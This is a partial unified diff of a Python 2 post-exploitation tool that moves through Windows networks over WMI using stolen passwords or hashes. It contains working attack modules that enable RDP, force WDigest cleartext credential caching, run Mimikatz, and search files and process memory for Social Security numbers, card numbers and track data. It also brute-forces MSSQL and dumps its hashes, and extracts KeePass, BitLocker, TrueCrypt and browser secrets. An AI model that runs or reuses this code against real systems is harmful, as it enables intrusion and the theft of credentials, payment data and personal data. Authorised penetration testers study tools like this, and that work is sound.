-                    if debugMode==True:
-                        print results  
-                    command='netsh advfirewall firewall set rule name="Remote Desktop (TCP-In)" new enable=Yes profile=domain'
-                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-                    command='netsh advfirewall firewall set rule name="Remote Desktop - RemoteFX (TCP-In)" new enable=Yes profile=domain'
-                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-                    command='net start TermService'
-                    results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
-    os._exit(0)
-'''
-nm = nmap.PortScanner()
-for ip in nbList:
-    nm.scan(ip, arguments='-O -A -sV -p 135,445')
-
-    nmapResults=str(nm[ip]['hostscript'][1]['output'])
-    if "Windows 10" in nmapResults:
-        print "Windows 10 found"
-        #print (setColor("[*]", bold, color="blue"))+" "+ip+":445 [amsi]     | Enabling AMSI Bypass"
-        passwordHash=None      
-        #dumpSAM(ip,domain,username,password,passwordHash)
-        runMimikatz(ip,domain,username,password,passwordHash)
-        os._exit(0)
-    if "Windows 7" in nmapResults:
-        print "Windows 7 found"
-
-
-        #print ip+"\t"+nm[ip]['osmatch'][0]['osclass'][1]['cpe'][0]
-os._exit(1)
-
-'''
-
-
-if args.module=='files':
-    tmpResultList=[]
-    print (setColor("\nSearching Drives for Interesting Files", bold, color="green"))
-    if len(accessAdmHostList)>0:
+    if args.module=='pii':
+        print (setColor("\nFinding Personally identifiable information (PII)", bold, color="green"))
+        tmpResultList=[]
+        command='Get-ChildItem -Path "c:\\Users" -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String \"[0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" | Select-Object Path, Line, LineNumber | Export-CSV C:\\windows\\pii.txt'
         for x in accessAdmHostList:
             ip=x[0]
             domain=x[1]
@@ -5027,562 +5449,73 @@ if args.module=='files':
             else:
                 password=x[3]
                 passwordHash=None
-            tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
-            if len(tmpFileList)>0:
-                #print (setColor("[+]", bold, color="green"))+" Downloading the files from host: "+ip
-                count=0
-                for filename in tmpFileList:           
-                    filename=filename.strip()
-                    tmpFilename=(downloadFile(ip,domain,username,password,filename))
-                    if len(tmpFilename)>0:
-                        if count>0:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+(setColor("[download]", bold, color="green"))+" | "+filename+" | "+tmpFilename
-
-                        else:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+(setColor("[download]", bold, color="green"))+" | "+filename+" | "+tmpFilename
-                        if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
-                            tmpResultList=parseUnattendXML(tmpFilename)
-                            if len(tmpResultList)>0:
-                                headers = ["Username","Password"]
-                                print tabulate(tmpResultList,headers,tablefmt="simple")
-                                print "\n"
-                        if "ultravnc.ini" in filename.lower():
-                            tmpResultList=parseUltraVNC(tmpFilename)
-                            for x in tmpResultList:
-                                print "Password1: "+x[0]
-                                print "Password2: "+x[1]
-                        if "sitemanager.xml" in filename.lower():
-                            tmpResultList=parseSiteManagerXML(tmpFilename)
-                            headers = ["Host", "Username","Password"]
-                            print tabulate(tmpResultList,headers,tablefmt="simple")                    
-                        if ".txt" in filename.lower():
-                            with open(tmpFilename) as f:
-                                lines = f.read().splitlines()
-                                count1=0
-                                if len(lines)<10:
-                                    for x in lines:
-                                        x=x.strip()
-                                        if count1<10:
-                                            print x
-                                    count1+=1
-                        count+=1
-
-    os._exit(0)    
-if args.module=="mssqlshell":
-    for x in mssqlList:
-        ip=x
-        username=args.username
-        password=args.password    
-        query="use master;EXEC sp_configure 'show advanced options','1';RECONFIGURE WITH OVERRIDE;EXEC sp_configure;"
-        print query
-        tmpResultList=runSQLQuery(ip,username,password,query)
-        print tmpResultList
-        if len(tmpResultList)>0:
-            print tmpResultList
-            #tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[MSSQL] [Bruteforce|Found Account]", bold, color="green"))
-            #print tmpFooter
-
-if args.module=='wdigest':
-    for x in nbList:
-        targetIP=x
-        print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+(setColor("[wdigest]", color="green"))+" | Add UseLogonCredentials reg key"              
-        cmd='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f'
-        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
-    os._exit(0)    
-if args.module=='mssqlauto':
-    for x in mssqlList:
-        ip=x
-        port=1433
-        bruteMSSQLAuto(ip, port)
-    os._exit(0)    
-
-if args.module=='mssqlbrute':
-    for x in mssqlList:
-        ip=x
-        port=1433
-        bruteMSSQL(ip, port)
-    os._exit(0)    
-if args.module=='mssqldata':
-    for x in mssqlList:
-        ip=x
-        port=1433
-        username=args.username
-        password=args.password
-        dumpMSSQLIDF(ip, port,username,password,domain)
-    os._exit(0)    
-if args.module=='mssqlhash':
-    for x in mssqlList:
-        ip=x
-        port=1433
-        username=args.username
-        password=args.password
-        dumpMSSQLHash(ip, port,username,password,domain)
-    os._exit(0)    
-if args.module=="pan":    
-    tmpResultList=[]
-    print (setColor("\nSearching Drives for PAN Numbers", bold, color="green"))
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        if ip not in tmpDoneList:
-            tmpresults=diskCredDump(ip,domain,username,password,passwordHash)
-	    results=tmpresults.split("\n")
-            tmpFilename=''
-            found=False
-            tmpCardNoList=[]
-            for x in results:
-                if len(x)>0:
-                    if found==True:
-                        x=x.strip() 
-                        if len(x)<1:
-                            tmpResultList.append([ip,tmpFilename,tmpCardNoList])
-                            tmpCardNoList=[]
-                            found=False
-                        else:
-                            if "----------------" not in x:
-                                tmpCardNoList.append(x)
-                        #if "---------------------" not in x:
-                        #    tmpList1.append(x)
-                        #else:
-                        #    tmpResultList.append([tmpFilename," ".join(tmpList1)])   
-                        #    found=False
-                        #    tmpList1=[]
-                    if "File: " in x:
-                        x=x.replace("File: ","")
-                        tmpFilename=x
-                        found=True        
-            tmpDoneList.append(ip)
-    if len(tmpResultList)>0:
-        #print (setColor("\n[+]", bold, color="green"))+" Possible PAN numbers found in the below locations"
-        for x in tmpResultList:
-            tmpIP=x[0]
-            tmpFilename=x[1]
-            tmpCardNoList=x[2]
-            print setColor("[+]", bold, color="green")+" "+tmpIP+":445 | "+(setColor("[PAN] ", bold, color="green"))+tmpFilename+" | "+", ".join(tmpCardNoList)
-
-    #if len(tmpResultList)>0:
-    #    for x in tmpResultList:
-    #        print "here: "+str(x)
-    #    #print tabulate(tmpResultList,tablefmt="simple")
-
-    if len(accessAdmHostList)>0:
-        print (setColor("\nSearching Memory for PAN Numbers", bold, color="green"))
-        print "[*] Processes Running on Hosts"
-        dict={}        
-        for x in accessAdmHostList:
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            password=x[3]
-            passwordHash=None
-            tmpResultList=listProcesses(ip,domain, username, password,passwordHash)
-            tmpResultList1=[]
-	    tmpResultList2=tmpResultList.split("\n")
-	    for y in tmpResultList2:
-            	#for y in str(tmpResultList):
-                if len(y)>0:
-		    y = (y.split(",")[0]).replace('"','')
-                    if [y,ip] not in tmpResultList1:
-                        tmpResultList1.append([y,ip])
-            for y in tmpResultList1:
-                try:
-                    tmpStr=dict[y[0]]
-                    tmpStr+=", "+y[1]
-                    dict[y[0]]=tmpStr
-                except KeyError:
-                    dict[y[0]]=y[1]    
-        tmpResultList2=[]      
-        tmpCount=1                                        
-        for key, value in dict.iteritems():
-            tmpResultList2.append([tmpCount,key,value])
-            tmpCount+=1
-
-        selectedOption=''    
-        selectedProcessList=[] 
-        selectedProcess=''        
-        while len(selectedOption)<1:
-            print tabulate(tmpResultList2)   
-            print "[*] Please enter a number or enter '*' to dump and search all processes:"        
-            selectedOption=raw_input()
-        selectedHostList=[]
-        for x in tmpResultList2:  
-            if str(selectedOption)==str(x[0]) or str(selectedOption)=="*":                
-                selectedProcess=x[1]
-                selectedProcessList.append(x[1])
-                tmpSelectedHosts=x[2]
-                if "," in tmpSelectedHosts:
-                    tmpList1=tmpSelectedHosts.split(",")
-                    for g in tmpList1:
-                        g=g.strip()
-                        if g not in selectedHostList:
-                            selectedHostList.append(g)
-                else:
-                    if x[2] not in selectedHostList:
-                        selectedHostList.append(x[2])
-        if len(selectedHostList)>0:
-            for x in accessAdmHostList:
-                ip=x[0]
-                domain=x[1]
-                username=x[2]
-                password=x[3]
-                if ip in selectedHostList:
-                    for selectedProcess in selectedProcessList:
-                        print "[*] Dumping Process '"+selectedProcess+"' on Host: "+ip   
-                        tmpResultList=memCredDump(ip,domain,username,password,passwordHash,selectedProcess)
-                        if "Access is denied" not in str(tmpResultList):
-                            for y in tmpResultList:
-                                y=y.strip()
-                                if len(y)>0:
-                                    if "CARD NUM:" in y:
-                                        y=y.split("CARD NUM:")[1]
-                                        y=y.strip()
-                                        if len(y):
-                                            if cardLuhnChecksumIsValid(y)==True:
-                                                print y
-                                    if "TRACK DATA:" in y:                                        
-                                        y=y.split("TRACK DATA:")[1]
-                                        y=y.strip()
-                                        if len(y):
-                                            print y
- 	                   	print setColor("[*]", bold, color="blue")+" "+ip+":445 | "+(setColor("[PAN][Memory] ", bold, color="green"))+" | No PAN Numbers found"
-        os._exit(1)
-
-
-if args.module=='shares':
-    #python ms14_068.py 172.16.126.0/24 -d corp -u milo -p Password1 -M shares -o host=172.16.126.176
-    svrFilterList=[]
-    if args.module_options:
-        if "host=" in args.module_options[0]:
-            tmpip=(args.module_options[0]).replace("host=","")
-            svrFilterList.append(tmpip)
-    if len(accessAdmHostList)>0:
-        tmpBlackList=[]
-        tmpBlackList.append("Application Data")
-        tmpBlackList.append("Cookies")
-        tmpBlackList.append("Local Settings")
-        tmpBlackList.append("NetHood")
-        tmpBlackList.append("PrintHood")
-        tmpBlackList.append("Recent")
-        tmpBlackList.append("Start Menu")
-        tmpBlackList.append("Templates")
-        tmpBlackList.append("SendTo")
-        tmpBlackList.append("Videos")
-        tmpBlackList.append("Pictures")
-        tmpBlackList.append("Music")
-        tmpBlackList.append("Saved Games")
-        tmpBlackList.append("Searches")
-        tmpBlackList.append("Links")
-        tmpBlackList.append("Contacts")
-        tmpBlackList.append("ProgramData")
-        tmpBlackList.append("Program Files")
-        tmpBlackList.append("Program Files (x86)")
-        if args.module_options:
-            tmpFound=False
-            for x in accessAdmHostList:
-                tmpip=x[0]
-                if tmpip in svrFilterList:
-                    tmpFound=True
-            print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
-            if tmpFound==False:
-                print "No suitable hosts found"
-        else:
-            print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
-
-        for x in accessAdmHostList:            
-            headers = ["IP", "Share/File","Status","Credentials"]
-            tmpip=x[0]
-            tmpdomain=x[1]
-            tmpusername=x[2]
-            tmppassword=x[3]
-            try:
-                if len(svrFilterList)>0:
-                    if tmpip in svrFilterList:
-                        allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
-                else:
-                    allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
-                tmpOKList=[]
-                tmpFailedList=[]
-                tmpFailedList1=[]
-                tmpUserPassList=[]
-                credStr=tmpusername+"|"+tmppassword
-                if len(allowedList)>0:
-                    for x in allowedList:
-                        tmpFound=False
-                        for g in tmpBlackList:
-                            if g.lower() in x[3].lower():
-                                tmpFound=True
-                        if tmpFound==False:
-                            tmpOKList.append([x[0],str(x[3])[0:35],"[OK]",credStr])
-                if len(deniedList)>0:
-                    for x in deniedList:   
-                        tmpFound=False
-                        for z in tmpBlackList:
-                            if z in x[3]:
-                                tmpFound=True
-                        if tmpFound==False:
-                            tmpFailedList.append([x[0],str(x[3])[0:35],(setColor("[NOK]", bold, color="red"))])
-                tmpFailedList1=tmpFailedList
-                if [tmpip,tmpdomain,tmpusername,tmppassword] not in userPassList:
-                    userPassList.append([tmpip,tmpdomain,tmpusername,tmppassword])
-                for z in userPassList:
-                    for y in tmpFailedList:
-                        tmpIP=y[0]
-                        filePath=y[1]
-                        tmpdomain=(z[1]).lower()
-                        tmpusername=(z[2]).lower()
-                        tmppassword=z[3]
-                        if accessRemoteShare(tmpIP,filePath,tmpdomain, tmpusername, tmppassword)==True:
-                            tmpFailedList1.remove([tmpIP,filePath,(setColor("[NOK]", bold, color="red"))])
-                            tmpOKList.append([tmpIP,filePath,'[OK]',tmpusername+"|"+tmppassword])
-            except Exception as e:
-                print e
-                continue
-            tmpFailedList=tmpFailedList1
-            tmpFinalList=[]
-            for x in tmpOKList:
-                tmpFinalList.append([x[0],x[1],x[2],x[3]])
-            for x in tmpFailedList:
-                tmpFinalList.append([x[0],x[1],x[2],''])
-            print tabulate(tmpFinalList)
-
-if args.module=='reg':
-    #print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
-        for y in results:    
-            if y not in tmpResultList:     
-                tmpResultList.append(y)
-    if len(tmpResultList)>0:
-        for x in tmpResultList:
-            targetIP=x[0]
-            #tmpDomain="domain"
-            #tmpUsername="milo"
-            #tmpPassword="Password1"
-            tmpRegPath=x[1]
-            tmpCred=x[2]
-            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445"+" | "+domain+"\\"+username+":"+password+" | "+(setColor("[reg] ", color="green"))+"| "+tmpRegPath+" | "+tmpCred
-            #(setColor(" | "+tmpRegPath, bold, color="green"))                
-
-        #headers = ["Host","Reg Path", "Password/Hash"]
-        #print tabulate(tmpResultList,headers)
-    os._exit(0)
-
-if args.module=='route':
-    if len(accessAdmHostList)>0:
-        print (setColor("\n[*] Finding Network Routes", bold, color="green"))
-        dict={}        
-        for x in accessAdmHostList:
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            password=x[3]
-            if len(x[3])==65 and x[3].count(":")==1:
-                passwordHash=x[3]
-                password=None
-            else:
-                password=x[3]
-                passwordHash=None
-            findRoute(ip,domain,username,password,passwordHash)
-    os._exit(0)
-
-if args.module=='keepass':
-    #print (setColor("\nDumping Keepass Passwords", bold, color="green"))
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList:
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            if len(x[3])==65 and x[3].count(":")==1:
-                passwordHash=x[3]
-                password=None
-            else:
-                password=x[3]
-                passwordHash=None
-            results=getKeepass(ip,domain,username,password,passwordHash)
-            for y in results:
-                if len(y)>0:
-                    y=y.strip()
-                    if [ip,y] not in tmpResultList:
-                        tmpResultList.append([ip,y])
-            tmpDoneList.append(x[0])
-
-    if len(tmpResultList)>0:
-        #print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
-        for x in tmpResultList:
-            targetIP=x[0]
-            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[keepass] ", bold, color="green"))+"| "+x[1]
-    #else:
-    #    print "No results found"
-    os._exit(1)
-
-if args.module=="vuln":
-    from modules import ms08_067
-    from modules import ms17_010
-    ms08_067List=[]
-    for ip in nbList:
-        tmpResultList=ms08_067.check(ip)
-        if len(tmpResultList)>0:
+            results=findPII(ip,domain,username,password,passwordHash)
+            tmpResultList=results.split("\n")
+            tmpCount=0
             for x in tmpResultList:
-                tmpIP=x[0]
-                tmpStatus=x[1]
-                if tmpStatus=='VULNERABLE':
-                    if tmpIP not in ms08_067List:
-                        ms08_067List.append(tmpIP)
-                    #print (setColor("[+]", bold, color="green"))+" "+tmpIP+":445 | "+(setColor("[MS08-067]", color="green"))
-        result=ms17_010.check(ip)
-        if 'is likely VULNERABLE ' in result:
-            result=result.replace('[+] [','')
-            result=result.replace('(','')
-            result=result.replace(')','')
-            if ip not in ms08_067List:
-                result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS17-010]", color="green")))
-            else:
-                result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS08-067][MS17-010]", color="green")))                
-            print (setColor("[+] ", bold, color="green"))+result
-    os._exit(1)
+                if tmpCount>1:
+                    print x
+                tmpCount+=1
 
-if args.module=='mimikatz':
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList:
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            if len(x[3])==65 and x[3].count(":")==1:
-                passwordHash=x[3]
-                password=None
+    if args.module=="rdp":
+        if len(accessAdmHostList)>0:
+            print (setColor("\n[*] Enabling RDP on Hosts that were not enabled", bold, color="green"))
+            if len(rdpList)==len(nbList):
+                print "RDP has been enabled on all hosts"
             else:
-                password=x[3]
-                passwordHash=None
+                dict={}        
+                for x in accessAdmHostList:
+                    ip=x[0]
+                    domain=x[1]
+                    username=x[2]
+                    password=x[3]
+                    if len(x[3])==65 and x[3].count(":")==1:
+                        passwordHash=x[3]
+                        password=None
+                    else:
+                        password=x[3]
+                        passwordHash=None
+                    if ip not in rdpList:
+                        print "Enabling RDP on Host: "+ip
+                        command=powershellCmdStart+" -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
+                        results,status=runWMIEXEC(ip, domain, username, password, passwordHash, command)  
+                        if debugMode==True:
+                            print results  
+                        command='netsh advfirewall firewall set rule name="Remote Desktop (TCP-In)" new enable=Yes profile=domain'
+                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+                        command='netsh advfirewall firewall set rule name="Remote Desktop - RemoteFX (TCP-In)" new enable=Yes profile=domain'
+                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+                        command='net start TermService'
+                        results,status=runWMIEXEC(ip,domain,username,password,passwordHash,command)
+        os._exit(0)
+    '''
+    nm = nmap.PortScanner()
+    for ip in nbList:
+        nm.scan(ip, arguments='-O -A -sV -p 135,445')
+
+        nmapResults=str(nm[ip]['hostscript'][1]['output'])
+        if "Windows 10" in nmapResults:
+            print "Windows 10 found"
+            #print (setColor("[*]", bold, color="blue"))+" "+ip+":445 [amsi]     | Enabling AMSI Bypass"
+            passwordHash=None      
+            #dumpSAM(ip,domain,username,password,passwordHash)
             runMimikatz(ip,domain,username,password,passwordHash)
+            os._exit(0)
+        if "Windows 7" in nmapResults:
+            print "Windows 7 found"
+
+
+            #print ip+"\t"+nm[ip]['osmatch'][0]['osclass'][1]['cpe'][0]
     os._exit(1)
 
-if args.module=='tokens':
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-            tokensPriv(ip,domain,username,password,passwordHash)
-    os._exit(1)
+    '''
 
-if args.module=="bitlocker":
-    print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=getBitlockerKeys(ip,domain,username,password,passwordHash)
-        for y in results:
-            y=y.strip()
-            if len(y)>0:
-                tmpResultList.append([ip,y])
-    if len(tmpResultList)>0:
-        headers = ["IP","Bitlocker Keys"]
-        print tabulate(tmpResultList,headers,tablefmt="simple")
-    os._exit(1)
 
-if args.module=='truecrypt':
-    print (setColor("\nDecrypting Truecrypt", bold, color="green"))
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList: 
-            print "[*] Targeting Host: "+x[0]
-            tmpDoneList.append(x[0])
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            if len(x[3])==65 and x[3].count(":")==1:
-                passwordHash=x[3]
-                password=None
-            else:
-                password=x[3]
-                passwordHash=None
-            getTruecrypt(ip,domain,username,password,passwordHash)
-    os._exit(1)
-
-if args.module=="passwords":
-    print (setColor("\nDumping PuTTY, WinSCP, Remote Desktop saved sessions, Filezilla, SuperPuTTY", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=sessionGopher(ip,domain,username,password,passwordHash)
-        #for y in results:
-        #    if len(y)>0:
-        #        tmpResultList.append(y)
-    #if len(tmpResultList)>0:
-    #    print tabulate(tmpResultList,tablefmt="simple")
-    #else:
-    #    print "No results found"
-
-    print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
-        for y in results:    
-            if y not in tmpResultList:     
-                tmpResultList.append(y)
-    if len(tmpResultList)>0:
-        headers = ["Host","Reg Path", "Password/Hash"]
-        print tabulate(tmpResultList,headers)
-
-    print (setColor("\nFind Interesting Files", bold, color="green"))
-    tmpDoneList=[]
-    if len(accessAdmHostList)>0:
-        for x in accessAdmHostList:
-            if x[0] not in tmpDoneList:
+    if args.module=='files':
+        tmpResultList=[]
+        print (setColor("\nSearching Drives for Interesting Files", bold, color="green"))
+        if len(accessAdmHostList)>0:
+            for x in accessAdmHostList:
                 ip=x[0]
                 domain=x[1]
                 username=x[2]
@@ -5594,17 +5527,17 @@ if args.module=="passwords":
                     passwordHash=None
                 tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
                 if len(tmpFileList)>0:
-                    print (setColor("[+]", bold, color="green"))+" Downloading the files from host: "+ip
+                    #print (setColor("[+]", bold, color="green"))+" Downloading the files from host: "+ip
                     count=0
                     for filename in tmpFileList:           
                         filename=filename.strip()
                         tmpFilename=(downloadFile(ip,domain,username,password,filename))
                         if len(tmpFilename)>0:
                             if count>0:
-                                print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+                                print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+(setColor("[download]", bold, color="green"))+" | "+filename+" | "+tmpFilename
 
                             else:
-                                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+                                print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+(setColor("[download]", bold, color="green"))+" | "+filename+" | "+tmpFilename
                             if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
                                 tmpResultList=parseUnattendXML(tmpFilename)
                                 if len(tmpResultList)>0:
@@ -5631,63 +5564,68 @@ if args.module=="passwords":
                                                 print x
                                         count1+=1
                             count+=1
-            tmpDoneList.append(x[0])
 
+        os._exit(0)    
+    if args.module=="mssqlshell":
+        for x in mssqlList:
+            ip=x
+            username=args.username
+            password=args.password    
+            query="use master;EXEC sp_configure 'show advanced options','1';RECONFIGURE WITH OVERRIDE;EXEC sp_configure;"
+            print query
+            tmpResultList=runSQLQuery(ip,username,password,query)
+            print tmpResultList
+            if len(tmpResultList)>0:
+                print tmpResultList
+                #tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[MSSQL] [Bruteforce|Found Account]", bold, color="green"))
+                #print tmpFooter
 
-    print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=getBitlockerKeys(ip,domain,username,password,passwordHash)
-        for y in results:
-            y=y.strip()
-            if len(y)>0:
-                tmpResultList.append([ip,y])
-    if len(tmpResultList)>0:
-        headers = ["IP","Bitlocker Keys"]
-        print tabulate(tmpResultList,headers,tablefmt="simple")
-    #else:
-    #    print "No results found"
-
-    print (setColor("\nDumping Keepass Passwords", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=getKeepass(ip,domain,username,password,passwordHash)
-        for y in results:
-            if len(y)>0:
-                y=y.strip()
-                if [ip,y] not in tmpResultList:
-                    tmpResultList.append([ip,y])
-    if len(tmpResultList)>0:
-        print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
-        for x in tmpResultList:
-            print x[0]+"\t"+x[1]
-    else:
-        print "No results found"
-
-
-    print (setColor("\nDumping Truecrypt Master Keys", bold, color="green"))
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList:
+    if args.module=='wdigest':
+        for x in nbList:
+            targetIP=x
+            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+(setColor("[wdigest]", color="green"))+" | Add UseLogonCredentials reg key"              
+            cmd='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f'
+            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
+        os._exit(0)    
+    if args.module=='mssqlauto':
+        for x in mssqlList:
+            ip=x
+            port=1433
+            bruteMSSQLAuto(ip, port)
+        os._exit(0)    
+    if args.module=='mssqlCmd':
+        for x in mssqlList:
+            ip=x
+            port=1433
+            bruteMSSQLCmd(ip, port)
+        os._exit(0)    
+    if args.module=='mssqlbrute':
+        for x in mssqlList:
+            ip=x
+            port=1433
+            bruteMSSQL(ip, port)
+        os._exit(0)    
+    if args.module=='mssqldata':
+        for x in mssqlList:
+            ip=x
+            port=1433
+            username=args.username
+            password=args.password
+            dumpMSSQLIDF(ip, port,username,password,domain)
+        os._exit(0)    
+    if args.module=='mssqlhash':
+        for x in mssqlList:
+            ip=x
+            port=1433
+            username=args.username
+            password=args.password
+            dumpMSSQLHash(ip, port,username,password,domain)
+        os._exit(0)    
+    if args.module=="pan":    
+        tmpResultList=[]
+        print (setColor("\nSearching Drives for PAN Numbers", bold, color="green"))
+        tmpDoneList=[]
+        for x in accessAdmHostList:
             ip=x[0]
             domain=x[1]
             username=x[2]
@@ -5697,34 +5635,408 @@ if args.module=="passwords":
             else:
                 password=x[3]
                 passwordHash=None
-            results=getTruecrypt(ip,domain,username,password,passwordHash)
-            tmpDoneList.append(x[0])
+            if ip not in tmpDoneList:
+                tmpresults=diskCredDump(ip,domain,username,password,passwordHash)
+                results=tmpresults.split("\n")
+                tmpFilename=''
+                found=False
+                tmpCardNoList=[]
+                for x in results:
+                    if len(x)>0:
+                        if found==True:
+                            x=x.strip() 
+                            if len(x)<1:
+                                tmpResultList.append([ip,tmpFilename,tmpCardNoList])
+                                tmpCardNoList=[]
+                                found=False
+                            else:
+                                if "----------------" not in x:
+                                    tmpCardNoList.append(x)
+                            #if "---------------------" not in x:
+                            #    tmpList1.append(x)
+                            #else:
+                            #    tmpResultList.append([tmpFilename," ".join(tmpList1)])   
+                            #    found=False
+                            #    tmpList1=[]
+                        if "File: " in x:
+                            x=x.replace("File: ","")
+                            tmpFilename=x
+                            found=True        
+                tmpDoneList.append(ip)
+        if len(tmpResultList)>0:
+            #print (setColor("\n[+]", bold, color="green"))+" Possible PAN numbers found in the below locations"
+            for x in tmpResultList:
+                tmpIP=x[0]
+                tmpFilename=x[1]
+                tmpCardNoList=x[2]
+                print setColor("[+]", bold, color="green")+" "+tmpIP+":445 | "+(setColor("[PAN] ", bold, color="green"))+tmpFilename+" | "+", ".join(tmpCardNoList)
 
-    print (setColor("\nDumping Browser Passwords", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        tmpip=x[0]
-        tmpdomain=x[1]
-        tmpusername=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            tmppasswordHash=x[3]
-            tmppassword=None
-        else:
-            tmppassword=x[3]
-            tmppasswordHash=None
-        results=dumpBrowser(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
-        if len(results)>0:
-            for y in results:
-                if y not in tmpResultList:
+        #if len(tmpResultList)>0:
+        #    for x in tmpResultList:
+        #        print "here: "+str(x)
+        #    #print tabulate(tmpResultList,tablefmt="simple")
+
+        if len(accessAdmHostList)>0:
+            print (setColor("\nSearching Memory for PAN Numbers", bold, color="green"))
+            print "[*] Processes Running on Hosts"
+            dict={}        
+            for x in accessAdmHostList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                password=x[3]
+                passwordHash=None
+                tmpResultList=listProcesses(ip,domain, username, password,passwordHash)
+                tmpResultList1=[]
+            tmpResultList2=tmpResultList.split("\n")
+            for y in tmpResultList2:
+                #for y in str(tmpResultList):
+                if len(y)>0:
+                    y = (y.split(",")[0]).replace('"','')
